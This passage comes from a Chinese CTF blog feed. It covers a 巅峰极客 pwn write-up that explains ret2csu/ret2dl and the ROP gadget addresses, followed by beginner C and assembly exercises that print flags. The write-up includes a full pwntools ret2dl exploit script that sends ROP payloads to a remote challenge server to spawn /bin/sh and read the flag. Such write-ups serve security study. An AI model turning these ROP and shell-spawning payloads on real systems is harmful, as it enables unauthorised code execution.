b’\x00’))</h3><p>这行代码定义了一个名为<code>uu32</code>的函数，这个函数没有输入参数。接下来我会逐一解释这个函数的每个部分。</p><ul><li><p><code>lambda</code>：在Python中，<code>lambda</code>是用来创建匿名函数的关键字。匿名函数是指没有名字的函数，只有参数列表和表达式。这里，<code>lambda</code>关键字之后的冒号(:)之前是输入参数的位置，这里没有输入参数。冒号之后的部分是该函数的主体。</p></li><li><p><code>p.recvuntil(b"\xf7")</code>：这是调用<code>p</code>对象的<code>recvuntil</code>方法，该方法会从与之相连的流中读取数据，直到遇到指定的字节序列。在这里，指定的字节序列是<code>b"\xf7"</code>。这行代码会返回从流开始到指定字节序列的所有数据。</p></li><li><p><code>[-4:]</code>：这是一个切片操作符，用于获取字符串的一个子集。在这里，它用于获取从接收的数据的最后四个字节。</p></li><li><p><code>.ljust(4, b'\x00')</code>：这是Python字符串的<code>ljust</code>方法，用于对字符串进行左对齐并填充指定的字符到指定的宽度。在这里，它用于确保获取的四个字节的数据长度至少为4个字节。如果获取的数据少于4个字节，那么将在右侧添加<code>\x00</code>字节，直到长度为4。</p></li><li><p><code>u32()</code>：这是<code>pwntools</code>库中的一个函数，用于将四字节的字符串解析为一个32位无符号整数。在这里，它用于将获取的四个字节的数据解析为一个32位无符号整数。</p></li></ul><p>总结一下，这个函数的工作流程是：</p><ol><li>从与之相连的流中读取数据，直到遇到指定的字节序列（<code>b"\xf7"</code>）。</li><li>获取读取的数据的最后四个字节。</li><li>确保获取的数据长度为4个字节，如果不够则在右侧添加<code>\x00</code>字节。</li><li>将获取的四个字节的数据解析为一个32位无符号整数。</li></ol><h3 id="九、转化为无符号字符（十进制）"><a href="#九、转化为无符号字符（十进制）" class="headerlink" title="九、转化为无符号字符（十进制）"></a>九、转化为无符号字符（十进制）</h3><p>在二进制漏洞利用中，将泄露的信息转换为无符号整数有很多重要的原因：</p><ol><li><p>计算机内部表示和处理数据的方式：计算机在内部使用二进制表示和处理所有的数据。这包括指令、地址、字符、整数等等。因此，当我们从一个程序中获得一些原始的二进制数据（例如，通过一个内存泄露漏洞），我们通常需要将这些数据转换为我们想要的格式以便于处理。在很多情况下，我们需要将这些数据看作是无符号整数，例如内存地址或者函数的偏移量。</p></li><li><p>无符号整数的范围更大：相对于有符号整数，无符号整数可以表示更大的正整数范围。在处理内存地址或者大的数据偏移量时，这一点是非常重要的。例如，一个32位的有符号整数只能表示从-2147483648到2147483647的整数，但是一个32位的无符号整数可以表示从0到4294967295的整数。</p></li><li><p>可移植性和兼容性：无符号整数在不同的计算机架构和操作系统之间有更好的可移植性和兼容性。对于二进制漏洞利用，我们通常需要在不同的环境中进行测试和验证，因此需要使用可以在所有环境中一致工作的数据类型。</p></li></ol><p>最后，需要注意的是，虽然这里我们将数据转换为无符号整数，但这并不意味着我们总是要这样做。在不同的情况下，我们可能需要将数据转换为其他的类型，例如字符串或者有符号整数。数据应该被转换为什么类型，取决于我们希望如何使用这些数据。</p><h3 id="十、retcsu和ret2dl"><a href="#十、retcsu和ret2dl" class="headerlink" title="十、retcsu和ret2dl"></a>十、retcsu和ret2dl</h3><p><code>ret2csu</code>和<code>ret2dl</code>都是一种返回导向编程（ROP, Return Oriented Programming）攻击方法，他们都是在exploit开发中用于绕过各种内存保护机制（如NX，DEP等）的常用技术。下面分别介绍一下它们：</p><ol><li><p><strong>ret2csu</strong>:<br>“csu”代表”C standard library startup routines”，这种方法使用程序在初始化过程中自动生成的一段代码（称为csu初始化函数）。<code>ret2csu</code>被用来调用程序已经链接的库中的函数，即使这个函数在程序的plt（过程链接表）中没有条目。这种技术允许我们调用任意函数并设置函数参数，它通常用于调用像read或write这样的函数来泄露内存信息，或者调用system函数来获得shell。</p></li><li><p><strong>ret2dl</strong>:<br>“dl”代表”dynamic linker”，<code>ret2dl</code>是一种特殊的ROP技巧，主要用于全局偏移表（GOT）完全只读（Full RELRO）的情况。在这种情况下，不能简单地通过GOT覆盖来调用任意的函数。<code>ret2dl</code>主要是利用动态链接器的某些功能，通过构造特殊的链接结构来构造任意函数调用。</p></li></ol><p>这两种方法的主要区别在于，<code>ret2csu</code>是利用程序初始化过程中的代码，而<code>ret2dl</code>则是利用动态链接器的功能。此外，<code>ret2csu</code>通常用于没有开启全局偏移表完全只读（Full RELRO）保护的程序，而<code>ret2dl</code>则可以在开启这种保护的程序中使用。</p><h3 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h3><p>在这里，所有的地址都是在二进制文件中找到的。你可以使用各种二进制分析工具（比如<code>objdump</code>、<code>readelf</code>或者<code>Ghidra</code>、<code>IDA Pro</code>等）来获取这些地址。这里我们简单解释一下每一个地址是如何找到的。</p><ol><li><p><code>pop_rdi=0x00000000004007e3</code>, <code>pop_rsi=0x00000000004007e1</code>, <code>pop_rsp=0x00000000004007dd</code> 和 <code>pop6_addr=0x4007DA</code> 这些地址是通过在二进制中搜索 ROP gadgets 得到的。这些 gadgets 是一些短的指令序列，后面通常紧跟着一个 <code>ret</code> 指令，被用来在构建 ROP 链时调整栈和寄存器的状态。你可以使用 <code>ROPgadget</code> 这样的工具来搜索这些 gadgets。</p></li><li><p><code>bss_0601040=0x0601040</code> 和 <code>bss_addr=0x601200</code> 这两个地址是在 ELF 文件的 BSS 段中找到的，这个区域常常用来存放程序中未初始化的全局变量。你可以使用 <code>readelf -S</code> 命令来查看 ELF 文件的各个段和它们的地址。</p></li><li><p><code>read_plt=0x4004E0</code> 和 <code>read_got=0x600FD8</code> 这两个地址是 read 函数在 PLT 和 GOT 表中的地址。你可以通过查看二进制文件的符号表或者使用工具如 <code>objdump -d</code> 或 <code>readelf -r</code> 来找到这些地址。</p></li><li><p><code>mov_addr=0x04007C0</code> 这个地址可能是从二进制中分析特定函数或者功能找到的，你可能需要使用反汇编工具或者动态调试工具（比如 <code>GDB</code>、<code>IDA Pro</code> 等）来找到这个地址。</p></li><li><p><code>ret=0x00000000004004c9</code> 这个地址通常是一个执行 <code>ret</code> 指令的地址，也可以使用工具如 <code>ROPgadget</code> 找到。</p></li></ol><p>注意，这些地址通常是在未开启地址空间布局随机化（ASLR）的环境中固定的。如果目标环境开启了 ASLR，那么你可能需要通过某种方式（如泄露信息或者布鲁特力猜测）来动态地获取这些地址。</p><h3 id="ret2dl-exp-py"><a href="#ret2dl-exp-py" class="headerlink" title="ret2dl exp.py"></a>ret2dl exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level='debug'  # 设置日志级别为debug，会输出更多调试信息# io=process('./ezzzz')  # 本地调试使用这行io=remote("pwn-12b3fb054a.challenge.xctf.org.cn", 9999, ssl=True)  # 连接远程服务器# 找到ROP链中使用的一些gadget的地址pop_rdi=0x4007E3  # gadget: pop rdi; retpop_rsi=0x4007E1  # gadget: pop rsi; pop r15; ret# 构造第一次的payload并发送pay=b'a'*0x10+p64(0x601c00)+p64(0x400752)io.send(pay)sleep(1)  # 等待1秒让程序处理输入# 构造第二次的payload并发送pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)pay+=p64(pop_rdi)+p64(0x600fd8)+p64(pop_rsi)pay+=p64(1)*2+p64(0x400606)+p64(0x400510)io.send(pay)# 构造第三次的payload并发送pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)pay+=p64(pop_rdi)+p64(0)+p64(pop_rsi)pay+=p64(0x601040)*2+p64(0x4004e0)+p64(0x400510)sleep(0.5)  # 等待0.5秒让程序处理输入io.send(pay)sleep(0.5)  # 等待0.5秒让程序处理输入io.send('\x90')  # 发送一个NOP（无操作）指令# 构造第四次的payload并发送pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)pay+=p64(pop_rdi)+p64(0)+p64(pop_rsi)pay+=p64(0x6010d0)*2+p64(0x4004e0)+p64(0x4007DA)pay+=p64(0)+p64(1)+p64(0x601040)+p64(0)+p64(0)+p64(0x601c00-0x10)pay+=p64(0x4007C0)sleep(0.5)  # 等待0.5秒让程序处理输入io.send(pay)# gdb.attach(io)  # 如果需要，可以在此处附加gdb进行调试sleep(0.5)  # 等待0.5秒让程序处理输入# 发送一些额外的数据，可能用于填充缓冲区io.send(b'a'*0x3b)# 尝试获取flagio.sendline('cat flag')io.recv()# 进入交互模式，可以手动输入命令和接收输出io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、web（hellosql）"><a href="#二、web（hellosql）" class="headerlink" title="二、web（hellosql）"></a>二、web（hellosql）</h2><p>平平无奇的sql注入,</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;都学半个月了，还是一个PWN打不出来、又是自闭的一天，快学，真的不想当师傅们的破绽啊，淦 QAQ……….&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://peekgeek.xctf.org.cn/race/dfjk&quot;&gt;https://peekgeek.xctf.org.cn</summary>
      
    
    
    
    <category term="CTF" scheme="https://poison-biao.github.io/categories/CTF/"/>
    
    
    <category term="巅峰极客" scheme="https://poison-biao.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>pwn013-034</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-exerciser-03.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-exerciser-03.html</id>
    <published>2023-07-16T18:15:00.000Z</published>
    <updated>2023-07-25T18:22:57.368Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、pwn013-c源代码"><a href="#一、pwn013-c源代码" class="headerlink" title="一、pwn013.c源代码"></a>一、pwn013.c源代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main() {    char flag[] = {99, 116, 102, 115, 104, 111, 119, 123, 104, 79, 119, 95, 116, 48, 95, 117, 115, 51, 95, 71, 67, 67, 63, 125, 0};    printf("%s", flag);    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在C语言中，<code>char</code>不是一个函数，而是一个数据类型，用于存储字符。当我们创建一个<code>char</code>类型的变量或数组，并给它赋值时，我们可以直接使用字符，如 <code>'a'</code>，或者使用对应的ASCII值，如 <code>97</code>。这两种方式都是等价的，因为 <code>'a'</code> 的ASCII值就是 <code>97</code>。</p><p>例如，以下两种方式创建的字符变量是等价的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char ch1 = 'a';char ch2 = 97;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这两种情况下，<code>ch1</code> 和 <code>ch2</code> 都存储了字符 <code>'a'</code>。</p><p>同样，我们可以使用ASCII值来初始化字符数组：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char arr1[] = {'H', 'e', 'l', 'l', 'o', '\0'};char arr2[] = {72, 101, 108, 108, 111, 0};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这两种情况下，<code>arr1</code> 和 <code>arr2</code> 都存储了字符串 “Hello”。因为 <code>'H'</code> 的ASCII值是 <code>72</code>，<code>'e'</code> 的ASCII值是 <code>101</code>，以此类推。最后的 <code>'\0'</code> 或 <code>0</code> 是字符串的结束标记，也就是空字符（null character）。</p><h2 id="二、pwn014-c源代码"><a href="#二、pwn014-c源代码" class="headerlink" title="二、pwn014.c源代码"></a>二、pwn014.c源代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库#include &lt;stdlib.h&gt; // 引入标准库#define BUFFER_SIZE 1024 // 定义缓冲区大小为1024int main() { // 主函数    FILE *fp; // 定义文件指针    unsigned char buffer[BUFFER_SIZE]; // 定义一个大小为BUFFER_SIZE的无符号字符数组作为缓冲区    size_t n; // 定义一个变量n，用于存储读取的字节数    fp = fopen("key", "rb"); // 以二进制读模式打开名为"key"的文件    if (fp == NULL) { // 如果文件打开失败        perror("Nothing here!"); // 打印错误信息        return -1; // 返回-1并结束程序    }    char output[BUFFER_SIZE * 9 + 12]; // 定义一个字符数组用于存储输出的字符串    int offset = 0; // 定义一个偏移量，用于在output数组中添加字符    offset += sprintf(output + offset, "ctfshow{"); // 在output数组的开头添加"ctfshow{"    while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) { // 循环读取文件，每次读取BUFFER_SIZE个字节，直到文件结束              for (size_t i = 0; i &lt; n; i++) { // 遍历 每个读取的字节            for (int j = 7; j &gt;= 0; j--) { // 遍历字节的每一位                offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1); // 将字节的每一位转换为二进制并添加到output数组中            }            if (i != n - 1) { // 如果不是最后一个字节                offset += sprintf(output + offset, "_"); // 在字节之间添加"_"            }        }        if (!feof(fp)) { // 如果文件还没有读完            offset += sprintf(output + offset, " "); // 在每个BUFFER_SIZE个字节之间添加" "        }    }    offset += sprintf(output + offset, "}"); // 在output数组的末尾添加"}"    printf("%s\n", output); // 打印output数组    fclose(fp); // 关闭文件    return 0; // 返回0并结束程序}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-指针fp："><a href="#1-指针fp：" class="headerlink" title="1.指针fp："></a>1.指针fp：</h3><p>总结：<code>fp</code> 是用来<strong>操作</strong> “key” 文件的。</p><p><code>fp</code> 是一个文件指针，它在 C 语言中用于操作文件。在这个程序中，<code>fp</code> 被用来打开一个名为 “key” 的文件，并读取其内容。</p><p>在 C 语言中，文件操作的函数（如 <code>fopen</code>，<code>fread</code>，<code>fclose</code> 等）都需要一个文件指针作为参数。这个文件指针指向一个 <code>FILE</code> 结构体，这个结构体包含了文件的所有信息，如文件位置，错误状态等。</p><p>在这个程序中，<code>fp</code> 被用在以下几个地方：</p><ul><li><p><code>fp = fopen("key", "rb");</code>：这行代码打开一个名为 “key” 的文件，并返回一个文件指针，这个文件指针被赋值给 <code>fp</code>。”rb” 表示以二进制读模式打开文件。</p></li><li><p><code>if (fp == NULL) { ... }</code>：这行代码检查 <code>fp</code> 是否为 <code>NULL</code>。如果 <code>fp</code> 为 <code>NULL</code>，说明文件打开失败。</p></li><li><p><code>while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) { ... }</code>：这行代码使用 <code>fread</code> 函数从文件中读取数据。<code>fread</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li><li><p><code>if (!feof(fp)) { ... }</code>：这行代码使用 <code>feof</code> 函数检查文件是否已经读到末尾。<code>feof</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li><li><p><code>fclose(fp);</code>：这行代码使用 <code>fclose</code> 函数关闭文件。<code>fclose</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li></ul><p>在C语言中，操作文件需要使用文件指针，如<code>fp</code>，主要有以下几个原因：</p><ol><li><p><strong>抽象和封装</strong>：文件指针是一个指向<code>FILE</code>结构体的指针，这个结构体在C语言的标准库中定义。<code>FILE</code>结构体包含了所有关于文件的信息，如文件位置、错误状态、缓冲区等。通过使用文件指针，C语言的标准库可以封装所有的文件操作，使得程序员不需要关心文件操作的底层细节。</p></li><li><p><strong>动态和灵活</strong>：通过使用文件指针，你可以动态地打开、读写和关闭文件。例如，你可以在运行时决定打开哪个文件，或者同时打开多个文件。</p></li><li><p><strong>兼容性</strong>：使用文件指针的文件操作函数（如<code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>等）是C语言标准库的一部分，这意味着它们可以在几乎所有的C语言环境中使用，包括不同的操作系统和硬件平台。</p></li><li><p><strong>错误处理</strong>：如果文件操作失败（例如，试图打开一个不存在的文件），<code>fopen</code>函数会返回<code>NULL</code>，你可以检查文件指针是否为<code>NULL</code>来判断文件操作是否成功。</p></li></ol><p>总的来说，使用文件指针是C语言处理文件的一种高级、抽象、灵活和兼容的方式。</p><h3 id="2-BUFFER-SIZE-9-12和offset"><a href="#2-BUFFER-SIZE-9-12和offset" class="headerlink" title="2.BUFFER_SIZE * 9 + 12和offset"></a>2.BUFFER_SIZE * 9 + 12<code>和</code>offset</h3><p>这段代码的主要目的是将读取到的每个字节转换为二进制形式，并将其存储在<code>output</code>数组中。这里的<code>BUFFER_SIZE * 9 + 12</code>和<code>offset</code>是关键部分，我会详细解释。</p><p>首先，<code>char output[BUFFER_SIZE * 9 + 12];</code>定义了一个字符数组<code>output</code>，用于存储输出的字符串。这个数组的大小是<code>BUFFER_SIZE * 9 + 12</code>，这是因为每个字节（8位）被转换为二进制形式后，需要9个字符的空间（8个字符表示二进制，1个字符表示下划线”_”）。所以，<code>BUFFER_SIZE</code>个字节需要<code>BUFFER_SIZE * 9</code>个字符的空间。另外，字符串的开头有”ctfshow{“（8个字符），末尾有”}”（1个字符），以及可能的空格字符（最多3个），所以总共需要额外的12个字符的空间。</p><p>然后，<code>int offset = 0;</code>定义了一个变量<code>offset</code>，它表示下一个要写入<code>output</code>数组的位置。初始时，<code>offset</code>被设置为0，表示从<code>output</code>数组的开头开始写入。</p><p>接下来，<code>offset += sprintf(output + offset, "ctfshow{");</code>将字符串”ctfshow{“写入<code>output</code>数组，并将<code>offset</code>增加了写入的字符数（即”ctfshow{“的长度，也就是8）。这样，<code>offset</code>就指向了<code>output</code>数组中下一个要写入的位置。</p><p>在接下来的循环中，每个字节的每一位都被转换为二进制形式，并写入<code>output</code>数组。<code>offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1);</code>这行代码做了两件事：一是将字节的一位转换为二进制形式并写入<code>output</code>数组，二是将<code>offset</code>增加了写入的字符数（这里是1，因为一位二进制只需要1个字符的空间）。这样，<code>offset</code>就始终指向了<code>output</code>数组中下一个要写入的位置。</p><p>总的来说，<code>BUFFER_SIZE * 9 + 12</code>是为了确保<code>output</code>数组有足够的空间来存储转换为二进制形式的字节，以及其他的字符。而<code>offset</code>则是用来跟踪<code>output</code>数组中下一个要写入的位置。</p><p>这行代码使用了两个函数：<code>sprintf</code>和<code>+=</code>操作符。我会分别解释它们。</p><h3 id="3、offset-x3D-sprintf-output-offset-“ctfshow-“"><a href="#3、offset-x3D-sprintf-output-offset-“ctfshow-“" class="headerlink" title="3、offset += sprintf(output + offset, “ctfshow{“"></a>3、offset += sprintf(output + offset, “ctfshow{“</h3><ol><li><p><code>sprintf</code>函数：<code>sprintf</code>是C语言中的一个函数，它用于将格式化的数据写入字符串。它的原型是<code>int sprintf(char *str, const char *format, ...);</code>，其中<code>str</code>是目标字符串，<code>format</code>是格式化字符串，<code>...</code>表示可变数量的参数。</p><p>在这个例子中，<code>sprintf(output + offset, "ctfshow{"</code>将字符串”ctfshow{“写入<code>output</code>数组的<code>offset</code>位置。<code>output + offset</code>表示<code>output</code>数组的<code>offset</code>位置的指针。这样，”ctfshow{“就被写入了<code>output</code>数组的正确位置。</p><p><code>sprintf</code>函数返回写入的字符数。在这个例子中，”ctfshow{“有8个字符，所以<code>sprintf</code>函数返回8。</p></li><li><p><code>+=</code>操作符：<code>+=</code>是C语言中的一个复合赋值操作符，它将左边的变量增加右边的值。例如，<code>a += b</code>等价于<code>a = a + b</code>。</p><p>在这个例子中，<code>offset += sprintf(output + offset, "ctfshow{"</code>将<code>offset</code>增加了<code>sprintf</code>函数返回的值，也就是写入的字符数。这样，<code>offset</code>就被更新为了<code>output</code>数组中下一个要写入的位置。</p></li><li><p>当我们写<code>output + offset</code>时，我们实际上是在进行指针运算。<code>output</code>是一个指针，它指向<code>output</code>数组的开始位置，<code>offset</code>是一个整数，它表示的是从<code>output</code>数组的开始位置开始的偏移量。所以，<code>output + offset</code>实际上是一个新的指针，它指向<code>output</code>数组中的<code>offset</code>位置。</p></li></ol><p>总的来说，<code>offset += sprintf(output + offset, "ctfshow{"</code>这行代码的作用是将字符串”ctfshow{“写入<code>output</code>数组的<code>offset</code>位置，并将<code>offset</code>更新为下一个要写入的位置。</p><h3 id="4、while-n-x3D-fread-buffer-sizeof-unsigned-char-BUFFER-SIZE-fp-gt-0"><a href="#4、while-n-x3D-fread-buffer-sizeof-unsigned-char-BUFFER-SIZE-fp-gt-0" class="headerlink" title="4、while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) > 0)"></a>4、while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0)</h3><p>这是一个<code>while</code>循环，它使用<code>fread</code>函数从文件中读取数据。让我们详细解释一下这个函数和循环的工作原理。</p><p><code>fread</code>是一个标准库函数，用于从文件流中读取数据。它的原型如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数有四个参数：</p><ol><li><code>ptr</code>：这是一个指向你想要存储读取数据的内存区域的指针。</li><li><code>size</code>：这是你想要读取的每个数据项的大小，以字节为单位。</li><li><code>nmemb</code>：这是你想要读取的数据项的数量。</li><li><code>stream</code>：这是一个指向你想要读取的文件流的指针。</li></ol><p><code>fread</code>函数会尝试读取<code>nmemb</code>个数据项，每个数据项的大小为<code>size</code>字节，从<code>stream</code>指向的文件流中，然后将读取的数据存储在<code>ptr</code>指向的内存区域。函数返回实际读取的数据项数量。</p><p>在你的代码中，<code>fread</code>函数的调用如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里，<code>buffer</code>是一个指向你想要存储读取数据的内存区域的指针，<code>sizeof(unsigned char)</code>是你想要读取的每个数据项的大小（这里是1字节），<code>BUFFER_SIZE</code>是你想要读取的数据项的数量，<code>fp</code>是一个指向你想要读取的文件流的指针。函数返回实际读取的数据项数量，并将这个数量赋值给<code>n</code>。</p><p><code>while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0)</code>这个循环会一直执行，直到<code>fread</code>函数返回的值不大于0，也就是说，直到没有更多的数据可以从文件中读取，或者发生了错误。在每次循环中，都会读取最多<code>BUFFER_SIZE</code>个字节的数据，并将读取的字节数赋值给<code>n</code>。然后，循环体中的代码会处理这些读取的数据。</p><h3 id="5、while循环"><a href="#5、while循环" class="headerlink" title="5、while循环"></a>5、while循环</h3><ol><li><code>for (size_t i = 0; i &lt; n; i++) {</code>：这是外层循环，它遍历每个读取的字节。<code>n</code>是通过<code>fread</code>函数从文件中读取的字节数，所以这个循环会遍历<code>buffer</code>数组中的每个字节。</li><li><code>for (int j = 7; j &gt;= 0; j--) {</code>：这是内层循环，它遍历字节的每一位。因为一个字节由8位（bit）组成，所以这个循环从7开始，到0结束，遍历字节的每一位。</li><li><code>offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1);</code>：这行代码将字节的每一位转换为二进制形式，并将结果添加到<code>output</code>数组中。这里的<code>buffer[i] &gt;&gt; j</code>是将<code>buffer[i]</code>的第<code>j</code>位移动到最右边，然后<code>&amp; 1</code>操作获取这一位的值（0或1）。<code>sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1)</code>将这个值转换为字符串（”0”或”1”），并写入<code>output</code>数组的<code>offset</code>位置。然后，<code>offset</code>被增加了写入的字符数（这里是1），所以它始终指向<code>output</code>数组中下一个要写入的位置。</li></ol><p>总的来说，这段代码是在将每个读取的字节转换为二进制形式，并将这些二进制形式的字节存储在<code>output</code>数组中。这个过程通过两个循环完成：外层循环遍历每个字节，内层循环遍历字节的每一位。</p><h4 id="运算过程："><a href="#运算过程：" class="headerlink" title="运算过程："></a>运算过程：</h4><ul><li>“C”的ASCII码值是67，二进制形式是1000011。</li><li>“T”的ASCII码值是84，二进制形式是1010100。</li><li>“F”的ASCII码值是70，二进制形式是1000110。</li><li>“s”的ASCII码值是115，二进制形式是1110011。</li><li>“h”的ASCII码值是104，二进制形式是1101000。</li><li>“o”的ASCII码值是111，二进制形式是1101111。</li><li>“w”的ASCII码值是119，二进制形式是1110111。</li></ul><p>然后，我们来看这个循环过程。假设我们已经从文件中读取了”CTFshow”，并将其存储在<code>buffer</code>数组中。那么，<code>n</code>就是7，因为”CTFshow”有7个字符。</p><p>在外层循环中，<code>i</code>从0到6，所以<code>buffer[i]</code>就是”CTFshow”的每个字符的ASCII码值。在内层循环中，<code>j</code>从7到0，所以<code>(buffer[i] &gt;&gt; j) &amp; 1</code>就是<code>buffer[i]</code>的每一位的值。然后，这个值被转换为字符串（”0”或”1”），并被添加到<code>output</code>数组中。</p><p>例如，当<code>i</code>是0时，<code>buffer[i]</code>就是”C”的ASCII码值67，它的二进制形式是1000011。在内层循环中，我们将67的每一位的值（从左到右）添加到<code>output</code>数组中，得到”1000011”。</p><p>当我们对”CTFshow”的每个字符都做这个操作后，<code>output</code>数组中就存储了”CTFshow”的二进制形式，即”1000011_1010100_1000110_1110011_1101000_1101111_1110111”。</p><h2 id="三、pwn015汇编源代码"><a href="#三、pwn015汇编源代码" class="headerlink" title="三、pwn015汇编源代码"></a>三、pwn015汇编源代码</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data  ; 数据段，用于声明和初始化一些全局变量    str1 db "CTFshow",0  ; 声明一个字符串变量str1，值为"CTFshow"    str2 db "_3@sy",0    ; 声明一个字符串变量str2，值为"_3@sy"    str3 db "@ss3mb1y",0 ; 声明一个字符串变量str3，值为"@ss3mb1y"    str4 db "_1s",0      ; 声明一个字符串变量str4，值为"_1s"    str5 db "ctfshow{"   ; 声明一个字符串变量str5，值为"ctfshow{"    str6 db "}"          ; 声明一个字符串变量str6，值为"}"section .text  ; 代码段，用于存放程序的代码    global _start  ; 声明一个全局的_start标签，这是程序的入口点_start:  ; 程序的入口点    mov eax, 4  ; 系统调用号4，表示write操作    mov ebx, 1  ; 文件描述符1，表示标准输出stdout    mov ecx, str5  ; 要写入的字符串的地址    mov edx, 8  ; 要写入的字符串的长度    int 0x80  ; 执行系统调用    mov eax, 4  ; 同上，写入str3    mov ebx, 1    mov ecx, str3    mov edx, 8    int 0x80    mov eax, 4  ; 同上，写入str4    mov ebx, 1    mov ecx, str4    mov edx, 3    int 0x80    mov eax, 4  ; 同上，写入str2    mov ebx, 1    mov ecx, str2    mov edx, 5    int 0x80    mov eax, 4  ; 同上，写入str6    mov ebx, 1    mov ecx, str6    mov edx, 1    int 0x80    mov eax, 1  ; 系统调用号1，表示exit操作    xor ebx, ebx  ; 清零ebx，表示退出状态为0    int 0x80  ; 执行系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、pwn16"><a href="#四、pwn16" class="headerlink" title="四、pwn16"></a>四、pwn16</h2><h3 id="汇编源代码"><a href="#汇编源代码" class="headerlink" title="汇编源代码"></a>汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.file"flag.c"  # 指定源代码文件名为"flag.c".text  # 指定接下来的部分为代码段.section.rodata  # 指定接下来的部分为只读数据段.LC0:.string"ctfshow{"  # 定义一个字符串"ctfshow{".text  # 回到代码段.globlctfshow  # 定义一个全局函数ctfshow.typectfshow, @function  # 指定ctfshow的类型为函数ctfshow:  # ctfshow函数的开始.LFB0:.cfi_startproc  # 表示函数的开始pushq%rbp  # 保存基指针.cfi_def_cfa_offset 16  # 更新CFA（Canonical Frame Address）偏移量.cfi_offset 6, -16  # 保存%rbp的旧值movq%rsp, %rbp  # 将栈指针的值赋给基指针.cfi_def_cfa_register 6  # 更新CFA的基准寄存器subq$32, %rsp  # 为局部变量分配空间movq%rdi, -24(%rbp)  # 将函数的第一个参数（%rdi）保存到局部变量中leaq.LC0(%rip), %rdi  # 将字符串"ctfshow{"的地址加载到%rdi中movl$0, %eax  # 将%eax清零，因为printf函数的浮点参数数量是通过%eax传递的callprintf@PLT  # 调用printf函数，打印"ctfshow{"movl$0, -4(%rbp)  # 初始化一个局部变量为0jmp.L2  # 跳转到.L2标签.L3:movl-4(%rbp), %eax  # 将局部变量的值加载到%eax中movslq%eax, %rdx  # 将%eax的值符号扩展后存入%rdxmovq-24(%rbp), %rax  # 将保存的第一个参数的值加载到%rax中addq%rdx, %rax  # 将%rdx和%rax的值相加movzbl(%rax), %eax  # 将%rax指向的字符加载到%eax中，并零扩展movzbl%al, %eax  # 将%al的值零扩展到%eaxmovl%eax, %edi  # 将%eax的值赋给%edicallputchar@PLT  # 调用putchar函数，打印一个字符addl$1, -4(%rbp)  # 将局部变量加1.L2:cmpl$15, -4(%rbp)  # 检查局部变量是否小于等于15jle.L3  # 如果是，跳转到.L3标签movl$125, %edi  # 将字符'}'的ASCII值（125）加载到%edi中callputchar@PLT  # 调用putchar函数，打印字符'}'nop  # 无操作leave  # 